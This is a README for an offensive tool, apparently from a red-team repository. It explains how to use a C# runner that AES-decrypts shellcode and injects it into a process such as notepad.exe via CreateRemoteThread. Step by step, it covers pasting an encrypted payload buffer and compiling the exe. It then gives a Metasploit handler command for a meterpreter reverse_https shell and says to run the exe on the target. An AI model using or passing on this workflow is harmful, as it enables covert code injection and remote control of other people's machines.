# AES Process Injection Runner

## Files

| File | Purpose |
|---|---|
| `aes-process-injection-shellcode-runner.cs` | C# runner — AES decrypts shellcode, injects into a target process via CreateRemoteThread |

## Usage

**1. Encrypt your shellcode** using `../aes-shellcode-encryption/` and copy the output `buf`.

**2. Paste the encrypted buf into `aes-process-injection-shellcode-runner.cs`:**
```csharp
byte[] buf = new byte[24] { 0x8a, 0x73, 0x4c, ... };  // ← replace with your full encrypted buf
```

**3. (Optional) Change the target process** — default is `notepad.exe`:
```csharp
Process targetProcess = Process.Start("notepad.exe");  // ← change if needed
```

**4. Compile:**

**Visual Studio:**
1. Create a new project → Console App (.NET Framework)
2. Replace `Program.cs` with the contents of `aes-process-injection-shellcode-runner.cs`
3. Set configuration to **Release** and platform to **x64**
4. Build → Build Solution (`Ctrl+Shift+B`)
5. Exe is in `bin\x64\Release\`

**Command line:**
```powershell
csc /target:exe /platform:x64 /optimize+ /out:Runner.exe aes-process-injection-shellcode-runner.cs
```

**5. Start your listener:**
```bash
msfconsole -q -x "
    use multi/handler;
    set payload windows/x64/meterpreter/reverse_https;
    set LHOST <IP>;
    set LPORT 443;
    run"
```

**6. Run the exe on the target.**
